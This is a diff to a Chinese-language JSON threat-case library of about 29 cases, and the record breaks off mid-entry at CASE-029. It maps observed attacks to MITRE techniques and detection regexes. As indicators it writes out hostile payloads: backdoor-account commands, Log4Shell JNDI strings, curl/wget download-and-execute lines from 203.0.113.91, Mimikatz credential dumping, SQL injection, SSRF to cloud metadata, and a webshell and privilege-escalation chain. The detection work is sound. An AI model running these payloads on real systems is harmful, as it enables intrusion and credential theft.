@@ -21,17 +21,21 @@
           "10.20.6.179",
           "10.20.6.162",
           "10.20.4.70",
-          "10.20.6.49"
+          "10.20.6.49",
+          "10.20.7.88",
+          "10.20.7.99"
         ],
         "observed_payloads": [
           "cmd.exe /c whoami（侦察探针）",
-          "cmd.exe /c net user /add backdoor 05449a53Aa1! && net localgroup ad...（创建后门账户并加入本地组，日志截断）"
+          "cmd.exe /c net user /add backdoor 05449a53Aa1! && net localgroup ad...（创建后门账户并加入本地组，日志截断）",
+          "cmd.exe /c whoami（10.20.7.88，侦察阶段前缀观测）",
+          "cmd.exe /c whoami && net user /add service 0xPassw0rd! && net localgroup admini…（10.20.7.99，创建后门账户 service 并加组；日志截断）"
         ],
         "signature_cmd": "wmic /node:<ip> process call create",
         "escalation_note": "载荷从侦察（whoami）升级为持久化（后门账户 net user /add backdoor + net localgroup），表明攻击者从侦察转入立足控制"
       },
-      "signature": "WMIC 远程进程创建：以 `wmic /node:<目标IP> process call create` 在远端主机执行命令；已四次观测，目标轮换（10.20.6.179 → 10.20.6.162 → 10.20.4.70 → 10.20.6.49），载荷演进：whoami 侦察 → 创建后门账户并加组（持久化）",
-      "reasoning": "WMIC 远程 process call create 是典型横向移动/远程执行手法（T1047）。早期载荷 whoami 为账户发现（T1033）；05-03 观测到载荷升级为 `net user /add backdoor 05449a53Aa1! && net localgroup ad…`——创建本地后门账户并加入组（推断为 administrators，T1136.001 创建账户 + T1098 账户操纵），属持久化行为。已四次观测（05-02、05-03、05-21 两次），目标轮换但载体一致，同一工具链且能力在升级。",
+      "signature": "WMIC 远程进程创建：以 `wmic /node:<目标IP> process call create` 在远端主机执行命令；已六次观测，目标轮换（10.20.6.179 → 10.20.6.162 → 10.20.4.70 → 10.20.6.49 → 10.20.7.88（侦察）→ 10.20.7.99（持久化）），载荷演进：whoami 侦察 → 创建后门账户并加组（持久化）",
+      "reasoning": "WMIC 远程 process call create 是典型横向移动/远程执行手法（T1047）。早期载荷 whoami 为账户发现（T1033）；05-03 观测到载荷升级为 `net user /add backdoor 05449a53Aa1! && net localgroup ad…`——创建本地后门账户并加入组（推断为 administrators，T1136.001 创建账户 + T1098 账户操纵），属持久化行为。已六次观测（05-02、05-03、05-21 两次、06-02 两次），目标轮换但载体一致，同一工具链且能力在升级。 新增观测：2026-06-02 09:11 wmic /node:10.20.7.88 仅带 whoami 侦察（前缀阶段）；同日 09:35 wmic /node:10.20.7.99 复现完整链——whoami → net user /add service 0xPassw0rd! → net localgroup admini…（截断）。后门账户名轮换（backdoor → service），目标转入 10.20.7.x 网段，工具链与载荷形态不变，判定同一攻击者/工具链持续（侦察→持久化演进再次复现）。",
       "retrieval_keys": [
         "wmic",
         "process call create",
@@ -55,6 +59,12 @@
         "whoami_probe",
         "net_user_add",
         "net_localgroup_add"
+      ],
+      "action_sources": [
+        "hids",
+        "any",
+        "hids",
+        "hids"
       ]
     },
     {
@@ -81,7 +91,8 @@
           "sufees-c760.net",
           "krcszg-16ff.net",
           "kpedpm-3d20.net",
-          "lvscco-60c8.net"
+          "lvscco-60c8.net",
+          "xkqwvp-9d2f.net"
         ],
         "subdomain_pattern": "8位随机十六进制前缀",
         "resolved_ips": [
@@ -116,13 +127,14 @@
           "10.10.30.8",
           "10.10.32.171",
           "203.0.113.102",
-          "10.10.36.7"
+          "10.10.36.7",
+          "203.0.113.77"
         ],
         "query_behavior": "每域名约2-5分钟内3次连续A记录查询，子域各不相同，解析IP轮换",
         "cross_wave_ip_reuse": "192.0.2.28 在 bpweeg-a867.net 与 clmiyk-4791.net 两波解析中复用（跨波基础设施关联证据）"
       },
-      "signature": "多个二级域（marwul-3b1b.net、aodldd-7342.net、bpweeg-a867.net、clmiyk-4791.net、oedgsv-2e73.net、maoamz-a258.net、ozcmfk-dee3.net、sufees-c760.net、krcszg-16ff.net、kpedpm-3d20.net、lvscco-60c8.net 等）下，短时间内连续查询 8 位随机十六进制前缀子域名的 A 记录，解析 IP 轮换——DGA/C2 回连信标特征，跨域反复出现（已十一次）",
-      "reasoning": "随机子域 + 固定主域 + 高频连续查询 + 解析IP轮换，符合 DGA（T1568.002）与 DNS C2 信标（T1071.004）。已十一次观测到不同主域呈现同一模式（marwul-3b1b.net、aodldd-7342.net、bpweeg-a867.net、clmiyk-4791.net、oedgsv-2e73.net、maoamz-a258.net、ozcmfk-dee3.net、sufees-c760.net、krcszg-16ff.net、kpedpm-3d20.net、lvscco-60c8.net），且解析 IP 跨波复用（192.0.2.28），疑似同一木马家族的 DGA 种子/域池轮换。正常业务不会在短窗口内连续请求随机子域且指向轮换IP。 新增观测：05-28 主域轮换为 lvscco-60c8.net（子域 2ab0df32、dccc1ee0、af02e69e；解析 IP 10.10.32.171、203.0.113.102、10.10.36.7），行为与既往一致（短窗口连续 A 记录、解析 IP 轮换）。",
+      "signature": "多个二级域（marwul-3b1b.net、aodldd-7342.net、bpweeg-a867.net、clmiyk-4791.net、oedgsv-2e73.net、maoamz-a258.net、ozcmfk-dee3.net、sufees-c760.net、krcszg-16ff.net、kpedpm-3d20.net、lvscco-60c8.net 等）下，短时间内连续查询 8 位随机十六进制前缀子域名的 A 记录，解析 IP 轮换——DGA/C2 回连信标特征，跨域反复出现（已十二次）",
+      "reasoning": "随机子域 + 固定主域 + 高频连续查询 + 解析IP轮换，符合 DGA（T1568.002）与 DNS C2 信标（T1071.004）。已十一次观测到不同主域呈现同一模式（marwul-3b1b.net、aodldd-7342.net、bpweeg-a867.net、clmiyk-4791.net、oedgsv-2e73.net、maoamz-a258.net、ozcmfk-dee3.net、sufees-c760.net、krcszg-16ff.net、kpedpm-3d20.net、lvscco-60c8.net），且解析 IP 跨波复用（192.0.2.28），疑似同一木马家族的 DGA 种子/域池轮换。正常业务不会在短窗口内连续请求随机子域且指向轮换IP。 新增观测：05-28 主域轮换为 lvscco-60c8.net（子域 2ab0df32、dccc1ee0、af02e69e；解析 IP 10.10.32.171、203.0.113.102、10.10.36.7），行为与既往一致（短窗口连续 A 记录、解析 IP 轮换）。 新增观测：2026-06-02 09:12 主域 xkqwvp-9d2f.net（子域 3fa2b9c1、解析 IP 203.0.113.77），8 位 hex 子域与 A 记录查询形态与既往一致。",
       "retrieval_keys": [
         "DGA",
         "随机子域",
@@ -141,18 +153,22 @@
         "sufees",
         "krcszg",
         "kpedpm",
-        "lvscco"
+        "lvscco",
+        "xkqwvp"
       ],
       "pattern_probes": [
         "\\b[0-9a-f]{8}\\.[a-z0-9-]+\\.(net|com|org)\\b"
       ],
       "action_sequence": [
         "dga_hex_subdomain"
+      ],
+      "action_sources": [
+        "dns"
       ]
     },
     {
       "id": "CASE-003",
-      "source": "WAF+RASP",
+      "source": "WAF+WEB+RASP",
       "attack_type": "Web 漏洞利用链：路径穿越(LFI) → Node.js 沙箱逃逸(RCE) → SSRF 窃取云元数据",
       "kill_chain": [
         "侦察(LFI读/etc/passwd)",
@@ -189,7 +205,7 @@
         ]
       },
       "signature": "Node.js Web 应用遭路径穿越(LFI)读 /etc/passwd，载荷用 `this.constructor.constructor('return process')().mainModule.require` 绕过沙箱实现 RCE，并 SSRF 到 169.254.169.254 窃取云实例元数据凭据；LFI 路径已跨目标复现（app-node-48 → app-nginx-61 → app-nginx-59 → app-nginx-102，含 /public、/static 前缀变体）；SSRF 直打 IMDS 再现为独立参数型向量（/api/fetch?url=…，app-node-173 / app-node-17）",
-      "reasoning": "URL 中 `../../../etc/passwd` 为路径穿越/文件包含（配合 T1190 利用公开应用）；`this.constructor.constructor('return process')()` 是经典 JS Function 构造器沙箱逃逸，取得 process 后可 mainModule.require 任意模块执行命令（T1059.007）；`url=@url:`http://169.254.169.254` 为 SSRF 打云元数据服务窃取实例凭据（T1552.005）。同一攻击 2 秒内被 WAF（网络层）与 RASP（运行时）同时捕获，属高置信恶意利用链。05-24 再次观测到同一路径的 LFI 试探（目标轮换 app-nginx-61.ops-corp.com，UA 轮换为 Android 移动端），判为同一战役路径复用；该次日志截断，仅见 LFI 阶段，未含 JS/SSRF 载荷证据。 新增观测：LFI 模版再现——05-28 app-nginx-59（原路径）、05-29 app-nginx-102（四级 ../ 变体）、05-01 app-node-67（/public 前缀＋cache_key 穿越）、app-node-186（/static 前缀＋mount overlay 提权尝试）；另见参数型 SSRF 独立向量（/api/fetch?url=http://169.254.169.254/latest/meta-data/，app-node-173、app-node-17），与其 SSRF 阶段同类（直读 IMDS 元数据）。路径模版持续跨目标复用，判定为同一工具习惯。",
+      "reasoning": "URL 中 `../../../etc/passwd` 为路径穿越/文件包含（配合 T1190 利用公开应用）；`this.constructor.constructor('return process')()` 是经典 JS Function 构造器沙箱逃逸，取得 process 后可 mainModule.require 任意模块执行命令（T1059.007）；`url=@url:`http://169.254.169.254` 为 SSRF 打云元数据服务窃取实例凭据（T1552.005）。同一攻击 2 秒内被 WAF（网络层）与 RASP（运行时）同时捕获，属高置信恶意利用链。05-24 再次观测到同一路径的 LFI 试探（目标轮换 app-nginx-61.ops-corp.com，UA 轮换为 Android 移动端），判为同一战役路径复用；该次日志截断，仅见 LFI 阶段，未含 JS/SSRF 载荷证据。 新增观测：LFI 模版再现——05-28 app-nginx-59（原路径）、05-29 app-nginx-102（四级 ../ 变体）、05-01 app-node-67（/public 前缀＋cache_key 穿越）、app-node-186（/static 前缀＋mount overlay 提权尝试）；另见参数型 SSRF 独立向量（/api/fetch?url=http://169.254.169.254/latest/meta-data/，app-node-173、app-node-17），与其 SSRF 阶段同类（直读 IMDS 元数据）。路径模版持续跨目标复用，判定为同一工具习惯。（source 字段补 WEB：数据集同单元存在 [web] 源行，见链层 action_sources 标注口径。）",
       "retrieval_keys": [
         "路径穿越",
         "LFI",
@@ -212,6 +228,23 @@
         "node_sandbox_escape",
         "imds_target",
         "mount_overlay_priv"
+      ],
+      "action_sources": [
+        [
+          "waf",
+          "web",
+          "rasp"
+        ],
+        "waf",
+        [
+          "waf",
+          "web",
+          "rasp"
+        ],
+        [
+          "waf",
+          "web"
+        ]
       ]
     },
     {
@@ -257,11 +290,16 @@
         "ssh_landed_key",
         "ssh_no_hostcheck",
         "id_hostname_probe"
+      ],
+      "action_sources": [
+        "hids",
+        "hids",
+        "any"
       ]
     },
     {
       "id": "CASE-005",
-      "source": "WAF+RASP",
+      "source": "WAF+WEB+RASP",
       "attack_type": "Web CGI 命令注入（双编码路径穿越绕过 + echo;id 探针）",
       "kill_chain": [
         "侦察/绕过(双编码规避检测)",
@@ -285,7 +323,7 @@
         ]
       },
       "signature": "针对 CGI 路径的 Web 命令注入：以双重 URL 编码（%%32%65→%2e→.）绕过检测构造 `../../` 穿越至 /bin/sh，注入 `echo;id` 探针命令——WAF/RASP 双层告警；已两次观测：第二次（05-02，app-php-201）为单层 `.%2e` 变体（/cgi-bin/.%2e/.%2e/bin/sh?cmd=echo;id），伴 `id=1; EXEC xp_cmdshell('id')--` 数据库命令探针混投",
-      "reasoning": "%%32%65 经两次解码还原为 `.`，双编码属典型 WAF 绕过手法；`/cgi-bin/../..//bin/sh` + `echo;id` 为 CGI 命令注入（T1190 利用公开应用 + T1059.004 Unix Shell 执行）。echo;id 是验证性探针（确认可执行后一般会扩大利用），常见于自动化扫描/利用工具。RASP 层捕获解码后的 {cmd: \"echo;id\"}，证实注入到达运行时。 第二次观测（05-02，HID0007462）：编码演化单层 `.%2e`，目标轮换 app-php-201；同请求携带 MSSQL 命令探针 `id=1; EXEC xp_cmdshell('id')--`。载体不变（CGI 路径导出 /bin/sh + echo;id 探针），判定同手法（编码变体已补入探测器）。",
+      "reasoning": "%%32%65 经两次解码还原为 `.`，双编码属典型 WAF 绕过手法；`/cgi-bin/../..//bin/sh` + `echo;id` 为 CGI 命令注入（T1190 利用公开应用 + T1059.004 Unix Shell 执行）。echo;id 是验证性探针（确认可执行后一般会扩大利用），常见于自动化扫描/利用工具。RASP 层捕获解码后的 {cmd: \"echo;id\"}，证实注入到达运行时。 第二次观测（05-02，HID0007462）：编码演化单层 `.%2e`，目标轮换 app-php-201；同请求携带 MSSQL 命令探针 `id=1; EXEC xp_cmdshell('id')--`。载体不变（CGI 路径导出 /bin/sh + echo;id 探针），判定同手法（编码变体已补入探测器）。（source 字段补 WEB：数据集同单元存在 [web] 源行，见链层 action_sources 标注口径。）",
       "retrieval_keys": [
         "cgi-bin",
         "命令注入",
@@ -305,6 +343,23 @@
         "cgi_sh_path",
         "echo_id_probe",
         "xp_cmdshell_probe"
+      ],
+      "action_sources": [
+        [
+          "waf",
+          "web",
+          "rasp"
+        ],
+        [
+          "waf",
+          "web",
+          "rasp"
+        ],
+        "any",
+        [
+          "waf",
+          "web"
+        ]
       ]
     },
     {
@@ -357,6 +412,18 @@
         "cmd_id_probe",
         "com_sun_gadget",
         "gcp_metadata_ssrf"
+      ],
+      "action_sources": [
+        [
+          "waf",
+          "rasp"
+        ],
+        "any",
+        "rasp",
+        [
+          "waf",
+          "web"
+        ]
       ]
     },
     {
@@ -397,6 +464,10 @@
       "action_sequence": [
         "net_view_domain",
         "smb_admin_share"
+      ],
+      "action_sources": [
+        "hids",
+        "hids"
       ]
     },
     {
@@ -438,6 +509,11 @@
         "ssti_object_chain",
         "popen_exec",
         "java_ser_magic"
+      ],
+      "action_sources": [
+        "waf",
+        "waf",
+        "waf"
       ]
     },
     {
@@ -480,6 +556,17 @@
         "sqli_tautology",
         "mass_assignment_admin",
         "mysql_load_file"
+      ],
+      "action_sources": [
+        [
+          "waf",
+          "rasp"
+        ],
+        "rasp",
+        [
+          "waf",
+          "web"
+        ]
       ]
     },
     {
@@ -521,6 +608,13 @@
       "action_sequence": [
         "cmd_loopback_probe",
         "weblogic_shellsession"
+      ],
+      "action_sources": [
+        "any",
+        [
+          "waf",
+          "web"
+        ]
       ]
     },
     {
@@ -564,6 +658,21 @@
         "tmui_semicolon_bypass",
         "tmshcmd_jsp",
         "tmsh_list_auth"
+      ],
+      "action_sources": [
+        "any",
+        [
+          "waf",
+          "web"
+        ],
+        [
+          "waf",
+          "web"
+        ],
+        [
+          "waf",
+          "web"
+        ]
       ]
     },
     {
@@ -606,6 +715,22 @@
         "phar_magic",
         "sqli_tautology",
         "php_ser_payload"
+      ],
+      "action_sources": [
+        [
+          "waf",
+          "web"
+        ],
+        [
+          "waf",
+          "web"
+        ],
+        [
+          "waf",
+          "web",
+          "rasp"
+        ],
+        "rasp"
       ]
     },
     {
@@ -649,6 +774,17 @@
         "script_javascript",
         "spring_routing_expr",
         "spel_type_ref"
+      ],
+      "action_sources": [
+        [
+          "waf",
+          "web"
+        ],
+        "rasp",
+        [
+          "waf",
+          "web"
+        ]
       ]
     },
     {
@@ -693,6 +829,21 @@
         "bash_reverse_shell",
         "dev_tcp_redir",
         "shebang_cmd_inject"
+      ],
+      "action_sources": [
+        [
+          "waf",
+          "web"
+        ],
+        [
+          "waf",
+          "web"
+        ],
+        [
+          "waf",
+          "web"
+        ],
+        "rasp"
       ]
     },
     {
@@ -735,6 +886,22 @@
         "user_register_path",
         "shebang_cmd_inject",
         "union_select_users"
+      ],
+      "action_sources": [
+        [
+          "waf",
+          "web",
+          "rasp"
+        ],
+        [
+          "waf",
+          "web",
+          "rasp"
+        ],
+        [
+          "waf",
+          "web"
+        ]
       ]
     },
     {
@@ -778,6 +945,19 @@
         "cmd_id_probe",
         "cache_key_traversal",
         "smuggle_marker"
+      ],
+      "action_sources": [
+        [
+          "waf",
+          "web",
+          "rasp"
+        ],
+        "any",
+        [
+          "waf",
+          "web"
+        ],
+        "any"
       ]
     },
     {
@@ -828,6 +1008,28 @@
         "echo_id_probe",
         "time_blind_sleep",
         "server_req_method_probe"
+      ],
+      "action_sources": [
+        [
+          "waf",
+          "web",
+          "rasp"
+        ],
+        [
+          "waf",
+          "web",
+          "rasp"
+        ],
+        "any",
+        [
+          "waf",
+          "web",
+          "rasp"
+        ],
+        [
+          "waf",
+          "web"
+        ]
       ]
     },
     {
@@ -869,6 +1071,17 @@
         "smuggle_marker",
         "xxe_doctype",
         "xxe_entity_system"
+      ],
+      "action_sources": [
+        "any",
+        [
+          "waf",
+          "web"
+        ],
+        [
+          "waf",
+          "web"
+        ]
       ]
     },
     {
@@ -913,6 +1126,12 @@
         "base64_w0",
         "fold_w30",
         "nslookup_var"
+      ],
+      "action_sources": [
+        "hids",
+        "hids",
+        "hids",
+        "hids"
       ]
     },
     {
@@ -952,6 +1171,22 @@
         "dags_run_path",
         "cmd_inject_semi_id",
         "script_exec_text"
+      ],
+      "action_sources": [
+        [
+          "waf",
+          "web",
+          "rasp"
+        ],
+        [
+          "waf",
+          "web",
+          "rasp"
+        ],
+        [
+          "waf",
+          "web"
+        ]
       ]
     },
     {
@@ -994,6 +1229,12 @@
         "tmp_svc_drop",
         "rclocal_append",
         "tmp_implant_drop"
+      ],
+      "action_sources": [
+        "hids",
+        "hids",
+        "hids",
+        "hids"
       ]
     },
     {
@@ -1037,6 +1278,373 @@
         "fpm_path_param",
         "cmd_id_probe",
         "xp_dirtree_unc"
+      ],
+      "action_sources": [
+        [
+          "waf",
+          "web",
+          "rasp"
+        ],
+        "any",
+        [
+          "waf",
+          "web"
+        ]
+      ]
+    },
+    {
+      "id": "CASE-023",
+      "source": "WAF",
+      "attack_type": "Log4j2 JNDI 注入 (Log4Shell) RCE",
+      "kill_chain": [
+        "初始访问/执行(JNDI 查找 ${jndi:ldap://...})",
+        "命令执行(加载远程恶意类)"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059.002"
+      ],
+      "indicators": {
+        "jndi_payload": "${jndi:ldap://203.0.113.50:1389/Exploit}",
+        "lookup_protocols": "ldap（可换 rmi/dns/iiop 变体）",
+        "vuln": "CVE-2021-44228",
+        "observed_paths": [
+          "/api/v1/info"
+        ],
+        "observed_payloads": [
+          "${jndi:rmi://192.0.2.44:1099/exp}（token 参数投递；rmi 协议变体）"
+        ]
+      },
+      "signature": "Web 应用查询参数携带 ${jndi:ldap://<攻击者>/...} JNDI 查找载荷——Log4j2 消息查找触发远程类加载 (Log4Shell)；已两次观测，lookup 协议轮换（ldap → rmi）",
+      "reasoning": "${jndi:...} 是 Log4j2 消息查找语法的 JNDI 注入特征（CVE-2021-44228）。Log4j 对日志消息做递归查找，JNDI lookup 会连接攻击者 LDAP 服务器加载远程恶意类实现 RCE（T1190 利用公开应用 + T1059.002 JNDI 命令执行）。协议可换 rmi/dns/iiop，属同一漏洞家族变体。 新增观测：2026-06-02 09:15 /api/v1/info?token=${jndi:rmi://192.0.2.44:1099/exp}——lookup 协议换 rmi、投递点换 token 参数，载荷形态不变，判定同一手法变体。",
+      "retrieval_keys": [
+        "Log4j",
+        "Log4Shell",
+        "JNDI",
+        "jndi",
+        "ldap",
+        "CVE-2021-44228",
+        "日志注入",
+        "T1190"
+      ],
+      "pattern_probes": [
+        "\\$\\{jndi:",
+        "jndi:(ldap|rmi|dns|iiop)"
+      ],
+      "action_sequence": [
+        "jndi_lookup"
+      ],
+      "action_sources": [
+        "waf"
+      ]
+    },
+    {
+      "id": "CASE-024",
+      "source": "WAF",
+      "attack_type": "Web 上传目录 JSP webshell 命令执行探针（/uploads/shell.jsp）",
+      "kill_chain": [
+        "初始访问/执行(上传目录 JSP webshell 访问)",
+        "执行(cmd=id 命令探针)"
+      ],
+      "mitre": [
+        "T1190",
+        "T1505.003"
+      ],
+      "indicators": {
+        "path": "/uploads/shell.jsp?cmd=id",
+        "webshell_note": "shell.jsp 位于上传目录且以 cmd 参数调用——上传型 JSP webshell 的典型访问形态",
+        "detection": "WAF 单层"
+      },
+      "signature": "上传目录 JSP webshell 被调用执行命令（/uploads/shell.jsp?cmd=id）：shell.jsp 命名 + /uploads/ 路径 + cmd=id 探针组合——疑似文件上传落地的 webshell 首次利用",
+      "reasoning": "请求落于上传目录 /uploads/ 下的 shell.jsp 并携带 cmd=id 命令参数：shell.jsp 命名与上传目录组合为典型 JSP webshell 访问形态（T1505.003 服务器软件组件:Web Shell），cmd=id 为命令执行验证探针（T1190 利用公开应用）。与 CASE-006/016/022 共享通用 cmd=id 探针，但利用载体不同（JSP webshell vs 反序列化载荷 / fpm_path / /api/exec 接口），按技术差异新建。证据从严：日志仅见本次访问，上传动作与命令回显均不可见。",
+      "retrieval_keys": [
+        "/uploads/shell.jsp",
+        "webshell",
+        "JSP",
+        "shell.jsp",
+        "cmd=id",
+        "T1505.003"
+      ],
+      "pattern_probes": [
+        "uploads/[a-z0-9_]+\\.jsp",
+        "shell\\.jsp"
+      ],
+      "action_sequence": [
+        "uploads_jsp_shell",
+        "cmd_id_probe"
+      ],
+      "action_sources": [
+        "waf",
+        "any"
+      ]
+    },
+    {
+      "id": "CASE-025",
+      "source": "WAF",
+      "attack_type": "Java 反序列化 RCE 尝试：/api/v2/render（deserialization 参数投递 java.util 序列化流）",
+      "kill_chain": [
+        "初始访问/执行(公开应用反序列化入口)",
+        "执行(Java 序列化流载荷投递)"
+      ],
+      "mitre": [
+        "T1190"
+      ],
+      "indicators": {
+        "path": "/api/v2/render",
+        "payload": "deserialization=rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0（base64；解码为 Java 序列化流魔数 AC ED 00 05 + java.util.ArrayList 类）",
+        "detection": "WAF 单层"
+      },
+      "signature": "渲染接口 /api/v2/render 遭 Java 反序列化载荷投递：deserialization 参数携带 rO0AB 开头序列化流（java.util.ArrayList）——与 CASE-006 同魔数、不同接口载体（路径/参数形态不同）",
+      "reasoning": "POST /api/v2/render 以 deserialization 参数携带 rO0AB 开头 base64：解码为 Java 序列化流（AC ED 00 05 魔数，首个类 java.util.ArrayList），属对公开应用不安全反序列化点的 RCE 尝试（T1190）。与 CASE-006 共享 rO0AB 魔数但利用载体不同（CASE-006 为 /webtools/control/main、/api/json 且携 com.sun 系 gadget；本波为 /api/v2/render + java.util 类前缀），按技术差异新建。证据从严：仅见载荷投递，未见执行结果与后续 gadget 动作。",
+      "retrieval_keys": [
+        "反序列化",
+        "Java",
+        "rO0AB",
+        "deserialization",
+        "/api/v2/render",
+        "T1190"
+      ],
+      "pattern_probes": [
+        "deserialization=rO0AB",
+        "/api/v2/render"
+      ],
+      "action_sequence": [
+        "render_api_path",
+        "java_ser_magic"
+      ],
+      "action_sources": [
+        "waf",
+        "waf"
+      ]
+    },
+    {
+      "id": "CASE-026",
+      "source": "WAF",
+      "attack_type": "Web SQL 注入：搜索接口时间盲注（/api/v2/search，' AND (SELECT sleep(5))--）",
+      "kill_chain": [
+        "侦察/初始访问(搜索接口 SQL 注入探测)",
+        "探测验证(时间盲注 sleep 延迟)"
+      ],
+      "mitre": [
+        "T1190"
+      ],
+      "indicators": {
+        "path": "/api/v2/search?q=admin' AND (SELECT sleep(5))--",
+        "payload": "q=admin' AND (SELECT sleep(5))--（引号闭合 + AND 串联带 sleep 延迟子查询 + 注释截断）",
+        "detection": "WAF 单层"
+      },
+      "signature": "搜索接口遭时间盲注：q=admin' AND (SELECT sleep(5))--——引号闭合后 AND 拼接 sleep 子查询，以响应延迟判定注入结果（载体 /api/v2/search）",
+      "reasoning": "q 参数以 admin' 闭合字符串、AND 串联 (SELECT sleep(5)) 子查询并以 -- 截断：时间盲注经典写法（T1190 利用公开应用），5 秒量级为按秒验证。与 CASE-017 的辅助载荷 id;SELECT sleep(5)-- 共享 sleep 时间盲注手法，但利用载体不同（搜索接口 q 参数 vs _method=__construct 框架参数覆盖链），按技术差异新建；检索命中 CASE-017 仅弱档（time_blind_sleep 单动作）。",
+      "retrieval_keys": [
+        "SQL注入",
+        "时间盲注",
+        "sleep(5)",
+        "/api/v2/search",
+        "盲注",
+        "T1190"
+      ],
+      "pattern_probes": [
+        "'\\s*AND\\s*\\(\\s*SELECT\\s+sleep\\(",
+        "/api/v2/search"
+      ],
+      "action_sequence": [
+        "search_api_path",
+        "sqli_and_sleep"
+      ],
+      "action_sources": [
+        "waf",
+        "waf"
+      ]
+    },
+    {
+      "id": "CASE-027",
+      "source": "HIDS",
+      "attack_type": "Windows 凭据窃取：Mimikatz 抓取 LSASS 凭据（sekurlsa::logonpasswords）",
+      "kill_chain": [
+        "执行(Mimikatz 工具运行)",
+        "凭据访问(LSASS 内存凭据抓取)"
+      ],
+      "mitre": [
+        "T1003.001"
+      ],
+      "indicators": {
+        "observed_cmd": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
+        "note": "privilege::debug 前置提权（SeDebugPrivilege）→ sekurlsa::logonpasswords 读取 LSASS 内存凭据；exit 收尾为批处理式调用"
+      },
+      "signature": "主机执行 Mimikatz 批处理命令：mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit——提权调试后抓取 LSASS 登录凭据（典型凭据窃取）",
+      "reasoning": "sekurlsa::logonpasswords 为 Mimikatz 读取 LSASS 进程内存提取口令/哈希的模块（T1003.001 OS Credential Dumping:LSASS Memory）；privilege::debug 为其前置调试提权步骤——组合调用为工具化凭据窃取。证据从严：日志仅见命令行，未见凭据输出与后续利用。检索无实质命中（动作/关键词均零命中）→ 新案例。",
+      "retrieval_keys": [
+        "mimikatz",
+        "sekurlsa",
+        "logonpasswords",
+        "LSASS",
+        "凭据窃取",
+        "privilege::debug",
+        "T1003"
+      ],
+      "pattern_probes": [
+        "mimikatz",
+        "sekurlsa::logonpasswords"
+      ],
+      "action_sequence": [
+        "mimikatz_exec",
+        "mimikatz_privilege_debug",
+        "sekurlsa_logonpasswords"
+      ],
+      "action_sources": [
+        "hids",
+        "hids",
+        "hids"
+      ]
+    },
+    {
+      "id": "CASE-028",
+      "source": "WAF+HIDS",
+      "attack_type": "载荷下载执行链：curl/wget 拉取隐藏载荷 → /tmp 落地 → chmod +x → 执行",
+      "kill_chain": [
+        "执行/交付(下载器把载荷落地 /tmp 隐藏文件)",
+        "执行(chmod +x 后运行载荷)"
+      ],
+      "mitre": [
+        "T1105",
+        "T1059.004",
+        "T1609"
+      ],
+      "indicators": {
+        "observed_cmds": [
+          "curl -s http://203.0.113.91/x.sh -o /tmp/.x && chmod +x /tmp/.x && /tmp/.x && crontab -l > /tmp/cron.bak（HIDS 主机侧，附 crontab 列举）",
+          "POST /containers/9f3a2b1c/exec {\"Cmd\":[\"/bin/sh\",\"-c\",\"wget -q http://203.0.113.91/b -O /tmp/.b && chmod +x /tmp/.b && /tmp/.b\"]}（WAF 侧：容器 exec API 载体，wget 变体）"
+        ],
+        "download_source": "203.0.113.91（两次观测同一拉取源）",
+        "dropped_files": [
+          "/tmp/.x",
+          "/tmp/.b"
+        ],
+        "container_exec_api": "POST /containers/<id>/exec（容器管理接口被用于执行 shell 命令）"
+      },
+      "signature": "同一拉取源 203.0.113.91 的下载执行链两次观测：HIDS 侧 curl -s http://203.0.113.91/x.sh -o /tmp/.x && chmod +x && 执行；WAF 侧容器 exec API 内 wget -q http://203.0.113.91/b -O /tmp/.b && chmod +x && 执行——下载→隐藏落地（/tmp/.x、/tmp/.b）→赋权→执行，载体轮换（主机 shell / 容器 exec API）",
+      "reasoning": "两日志同模版：从固定源 203.0.113.91 下载脚本/二进制至 /tmp 点前缀隐藏文件 → chmod +x → 立即执行（T1105 工具传输 + T1059.004 Unix Shell）；载体轮换——HIDS 侧直接 curl 落地（附 crontab -l > /tmp/cron.bak 计划任务列举），WAF 侧经容器管理接口 POST /containers/<id>/exec 投递等价 wget 命令（T1609 容器管理命令）。同一拉取源 + 同模版（下载→隐藏落地→赋权→执行）→ 合并为一个案例。证据从严：仅见命令，未见载荷内容与执行结果。检索无实质命中（动作零命中；关键词仅 CASE-014 cron 等弱分）→ 新案例。",
+      "retrieval_keys": [
+        "下载执行",
+        "落地执行",
+        "/tmp/.x",
+        "/tmp/.b",
+        "203.0.113.91",
+        "chmod +x",
+        "容器 exec",
+        "T1105"
+      ],
+      "pattern_probes": [
+        "-[oO]\\s+/tmp/\\.\\w+",
+        "chmod\\s+\\+x\\s+/tmp/\\.\\w+",
+        "post\\s+/containers/\\w+/exec"
+      ],
+      "action_sequence": [
+        "tmp_dot_download",
+        "chmod_x_tmp_dot",
+        "exec_tmp_dot"
+      ],
+      "action_sources": [
+        [
+          "waf",
+          "hids"
+        ],
+        [
+          "waf",
+          "hids"
+        ],
+        [
+          "waf",
+          "hids"
+        ]
+      ]
+    },
+    {
+      "id": "CASE-029",
+      "source": "WAF+WEB+RASP+HIDS+DNS",
+      "attack_type": "Exchange ProxyLogon 风格利用链：SSRF 入口 → IIS 进程执行 → ASPX webshell → PrintSpoofer 提权 → 服务持久化 → DNS 外传",
+      "kill_chain": [
+        "初始访问(SSRF 网关绕过 X-BEResource)",
+        "执行(IIS 工作进程派生 cmd.exe；aspnet_client 目录 ASPX webshell)",
+        "提权(PrintSpoofer / SeImpersonatePrivilege)",
+        "持久化(sc create 注册 Windows 服务)",
+        "C2/外传(DNS TXT 长 base64 标签 beacon)"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059.003",
+        "T1505.003",
+        "T1068",
+        "T1543.003",
+        "T1048.003"
+      ],
+      "indicators": {
+        "observed_targets": [
+          "app-web-31.ops-corp.com"
+        ],
+        "observed_domains": [
+          "exfil-cdn.com"
+        ],
+        "observed_payloads": [
+          "POST /ecp/7b37f0/ecp.aspx X-BEResource=localhost~1942062522（SSRF 入口请求，waf/web 双层同请求捕获）",
+          "进程创建: w3wp.exe (IIS APPPOOL\\DefaultAppPool) 派生子进程 cmd.exe /c whoami & ipconfig /all",
+          "POST /aspnet_client/system_web/upd_shell.aspx {\"cmd\":\"whoami\"} 200（webshell 落地/调用）",
+          "C:\\ProgramData\\PrintSpoofer.exe -i -c \"cmd /c whoami\" 提权成功 (SeImpersonatePrivilege)",
+          "sc.exe create UpdaterSvc binPath= \"C:\\ProgramData\\upd.exe\" start= auto",
